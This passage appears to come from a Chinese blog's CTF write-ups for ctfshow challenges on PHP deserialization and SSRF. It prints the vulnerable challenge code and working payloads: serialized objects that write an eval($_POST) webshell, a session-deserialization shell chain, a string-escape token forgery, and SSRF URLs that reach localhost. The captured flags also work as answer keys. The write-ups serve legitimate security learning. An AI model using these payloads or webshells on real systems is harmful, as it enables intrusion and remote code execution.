<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep()	 	//使用serialize（）时触发 </span><br><span class="line">__destruct() 	//对象被销毁时触发，在脚本终止或对象引用计数为0时调用，通常会执行数据清除就或连接断开操作 </span><br><span class="line">__call() 		//在对象上下文中调用不可访问的方法时触发 ，通常用于错误处理，防止脚本因为调用错误而终止执行</span><br><span class="line">__callStatic() 	//在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() 		//用于从不可访问的属性读取数据，通常用于设置和获取对象私有属性</span><br><span class="line">__set() 		//用于将数据写入不可访问的属性，通常用于设置和获取对象私有属性</span><br><span class="line">__isset() 		//在不可访问的属性上调用isset()或empty()触发 </span><br><span class="line">__unset() 		//在不可访问的属性上使用unset()时触发 </span><br><span class="line">__invoke() 		//当脚本尝试将对象调用为函数时触发</span><br><span class="line">__clone()       //当把一个对象赋给另一个对象时自动调用</span><br><span class="line">__wakeup()		//unserialize函数会检查是否存在wakeup方法，如果存在则先调用wakeup方法，做一些必要的初始化连数据库等操作</span><br><span class="line">__construct() 	//PHP5允许在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法</span><br><span class="line">__destruct()	  //PHP5引入析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</span><br><span class="line">__toString()	  //用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误</span><br></pre></td></tr></table></figure>

<p>file_put_contents — 将数据写入文件</p>
<p>如果 <code>filename</code>   不存在，将会创建文件。反之，存在的文件将会重写，除非设置   <strong><code>FILE_APPEND</code></strong> flag。  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//url编码一下get传参</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一句话木马</p>
<p>连接url&#x2F;877.php</p>
<p>执行1&#x3D;system(“ls &#x2F;“);</p>
<p>发现ctfshow{64baf76c-41a0-4795-922a-17076ed94eb2}</p>
<h2 id="web262-字符串逃逸"><a href="#web262-字符串逃逸" class="headerlink" title="web262 字符串逃逸"></a>web262 字符串逃逸</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>访问url&#x2F;message.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;</span><br><span class="line">    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));</span><br><span class="line">    if($msg-&gt;token==&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class message&#123;</span><br><span class="line"> </span><br><span class="line">public $token=&#x27;admin&#x27;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a=new message();</span><br><span class="line"> </span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web263session反序列化漏洞"><a href="#web263session反序列化漏洞" class="headerlink" title="web263session反序列化漏洞"></a>web263session反序列化漏洞</h2><p><a href="https://www.jb51.net/article/116246.htm">深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家 (jb51.net)</a></p>
<p><a href="https://www.cnblogs.com/meng-han/p/16851760.html">ctfshow web263(PHP的session反序列化漏洞) - hithub - 博客园 (cnblogs.com)</a></p>
<p>用dirsearch扫一下，发现<a href="http://www.zip文件,访问下载下来是网站源码./">www.zip文件，访问下载下来是网站源码。</a></p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	error_reporting(0);</span><br><span class="line">	session_start();</span><br><span class="line">	//超过5次禁止登陆</span><br><span class="line">	if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		 setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">		 $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>check.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require_once &#x27;inc/inc.php&#x27;;</span><br><span class="line">$GET = array(&quot;u&quot;=&gt;$_GET[&#x27;u&#x27;],&quot;pass&quot;=&gt;$_GET[&#x27;pass&#x27;]);</span><br><span class="line">if($GET)&#123;</span><br><span class="line"></span><br><span class="line">	$data= $db-&gt;get(&#x27;admin&#x27;,</span><br><span class="line">	[	&#x27;id&#x27;,</span><br><span class="line">		&#x27;UserName0&#x27;</span><br><span class="line">	],[</span><br><span class="line">		&quot;AND&quot;=&gt;[</span><br><span class="line">		&quot;UserName0[=]&quot;=&gt;$GET[&#x27;u&#x27;],</span><br><span class="line">		&quot;PassWord1[=]&quot;=&gt;$GET[&#x27;pass&#x27;] //密码必须为128位大小写字母+数字+特殊符号，防止爆破</span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	if($data[&#x27;id&#x27;])&#123;</span><br><span class="line">		//登陆成功取消次数累计</span><br><span class="line">		$_SESSION[&#x27;limit&#x27;]= 0;</span><br><span class="line">		echo json_encode(array(&quot;success&quot;,&quot;msg&quot;=&gt;&quot;欢迎您&quot;.$data[&#x27;UserName0&#x27;]));</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		//登陆失败累计次数加1</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;])+1);</span><br><span class="line">		echo json_encode(array(&quot;error&quot;,&quot;msg&quot;=&gt;&quot;登陆失败&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">date_default_timezone_set(&quot;Asia/Shanghai&quot;);</span><br><span class="line">session_start();</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;);</span><br><span class="line">$res=&quot;|&quot;.serialize($user);</span><br><span class="line">echo $res;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQoK</span><br></pre></td></tr></table></figure>

<p>抓包改limit值</p>
<p>访问check.php实现反序列化shell的写入，会写到根目录挺奇怪的</p>
<p>url&#x2F;log-1.php</p>
<p>蚁剑连接</p>
<h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;<span class="comment">//使token=password 得return 1; echo flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>token的值等于一个随机数，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshowAdmin</span><br><span class="line">&#123;</span><br><span class="line">    public $password;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;password = &amp;$this-&gt;token;</span><br><span class="line">    &#125;//不能直接等于</span><br><span class="line">&#125;</span><br><span class="line">$a = new ctfshowAdmin();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>引用（&amp;）的用法和应用</p>
<p>在PHP 中引用的意思是：<strong>不同的名字访问同一个变量内容</strong></p>
<p><a href="https://www.cnblogs.com/alsf/p/9621362.html">https://www.cnblogs.com/alsf/p/9621362.html</a></p>
<p>ctfshow{b3af121a-ce30-4452-a80f-9701f229041c}</p>
<h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;CTFSHOW&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>PHP特性：函数名和类名不区分大小写，变量名区分。</p>
<p>经过尝试hackbar,不能post  php:&#x2F;&#x2F;input,除了max hackbar,传参得到</p>
<p>ctfshow{2769a98f-097f-4919-aa09-f64ef83591dd}</p>
<h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2>]]></content>
      <categories>
        <category>web</category>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_ssrf</title>
    <url>/2023/02/02/ctfshow-ssrf/</url>
    <content><![CDATA[<p>ssrf介绍以及ctfshow_ssrf题</p>
 <span id="more"></span>

<h2 id="1、SSRF漏洞简介："><a href="#1、SSRF漏洞简介：" class="headerlink" title="1、SSRF漏洞简介："></a>1、SSRF<a href="https://javaforall.cn/tag/%E6%BC%8F%E6%B4%9E">漏洞</a>简介：</h2><p>SSRF全称：Server-Side Request Forgery，即，<a href="https://cloud.tencent.com/product/cvm?from=10680">服务器</a>端请求伪造。是一个由攻击者构造请求，在目标服务端执行的一个安全漏洞。攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，目标通常是从外网无法访问的内部系统。简单来说就是利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网进行攻击。</p>
<h2 id="2、主要攻击方式："><a href="#2、主要攻击方式：" class="headerlink" title="2、主要攻击方式："></a>2、主要攻击方式：</h2><p>当攻击者想要访问服务器B上的服务，但是由于存在防火墙或者服务器B是属于内网主机等原因导致攻击者无法直接访问。如果服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，达到攻击内网的目的。</p>
<p>DNS协议是用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址）</p>
 <!--more-->

<h5 id="url格式"><a href="#url格式" class="headerlink" title="url格式"></a>url格式</h5><p><a href="https://baike.baidu.com/item/URL%E6%A0%BC%E5%BC%8F/10056474?fr=aladdin">URL格式_百度百科 (baidu.com)</a></p>
<p>协议类型:&#x2F;&#x2F;服务器地址[:端口号]&#x2F;路径&#x2F;文件名[参数&#x3D;值]。</p>
<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>() <span class="comment">//这三个函数使用不当会造成ssrfl漏洞</span></span><br></pre></td></tr></table></figure>

<h5 id="curl库"><a href="#curl库" class="headerlink" title="curl库"></a>curl库</h5><p>curl是PHP的一个扩展，利用该扩展可以实现服务器之间的数据或文件传输</p>
<p><a href="https://www.php.net/manual/zh/book.curl.php">https://www.php.net/manual/zh/book.curl.php</a></p>
<h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>用 cURL 函数的基本思想是先使用 <a href="https://www.php.net/manual/zh/function.curl-init.php">curl_init()</a> 初始化 cURL会话，接着可以通过 <a href="https://www.php.net/manual/zh/function.curl-setopt.php">curl_setopt()</a> 设置需要的全部选项，然后使用 <a href="https://www.php.net/manual/zh/function.curl-exec.php">curl_exec()</a> 来执行会话，当执行完会话后使用 <a href="https://www.php.net/manual/zh/function.curl-close.php">curl_close()</a> 关闭会话。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>ctfshow{fa1bbf25-b061-4ed6-bbde-a1c388eb367e}</p>
<h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">/*本函数不是用来验证给定 URL 的有效性的，只是将其分解为下面列出的部分。也会接受不完整或无效的 URL，parse_url() 会尝试尽量正确解析*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<p>parse_url()函数</p>
<p> scheme——如 http  ,         host  ,        port  ,         user       ,      pass       ,    path         ,</p>
<p>  query——在问号 <code>?</code> 之后         .</p>
<p>  fragment——在注释符号 <code>#</code> 之后         </p>
<p><a href="https://www.php.net/manual/zh/function.parse-url">https://www.php.net/manual/zh/function.parse-url</a></p>
<p>上题payload依旧可用</p>
<p><code> </code>ctfshow{2152a6a2-ee73-4272-9d80-7a7bf43591c2}</p>
<h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了local  127.0.   。</p>
<p><code>url=http://0/flag.php</code></p>
<h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">if(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>解法一：payload:</p>
<p><code>url=http://r.3hpgmf.ceye.io/flag.php</code></p>
<p>解法二payload:</p>
<p><code>url=http://sudo.cc/flag.phpd</code></p>
